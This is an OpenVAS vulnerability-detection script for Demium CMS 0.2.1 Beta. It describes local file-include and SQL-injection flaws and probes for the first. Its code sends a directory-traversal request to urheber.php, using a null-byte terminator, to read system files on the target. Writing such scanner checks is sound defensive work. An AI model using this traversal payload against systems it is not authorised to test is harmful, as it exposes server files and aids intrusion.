###############################################################################
# OpenVAS Vulnerability Test
# $Id: demium_cms_multiple_vulnerabilities.nasl 9350 2018-04-06 07:03:33Z cfischer $
#
# Demium CMS Multiple Local File Include and SQL Injection
# Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Demium CMS is prone to multiple local file-include vulnerabilities and
  SQL-injection vulnerabilities because it fails to properly sanitize
  user-supplied input.

  An attacker can exploit the local file-include vulnerabilities using
  directory-traversal strings to view and execute arbitrary local files within
  the context of the webserver process. Information harvested may aid in further
  attacks.

  The attacker can exploit the SQL-injection vulnerabilities to compromise the
  application, access or modify data, or exploit latent vulnerabilities in the
  underlying database.

  Demium CMS 0.2.1 Beta is vulnerable; other versions may also be affected.";

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100008");
 script_version("$Revision: 9350 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:03:33 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2009-03-02 16:07:07 +0100 (Mon, 02 Mar 2009)");
 script_bugtraq_id(33933);
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_name("Demium CMS Multiple Local File Include and SQL Injection Vulnerabilities");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port)) exit(0);

files = traversal_files();

foreach dir( make_list_unique( "/demium", cgi_dirs( port:port ) ) ) { 

  if( dir == "/" ) dir = "";

  foreach file (keys(files)) {

    url = string(dir, "/urheber.php?name=../../../../../../../../../../",files[file],"%00");

    if(http_vuln_check(port:port, url:url,pattern:file)) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
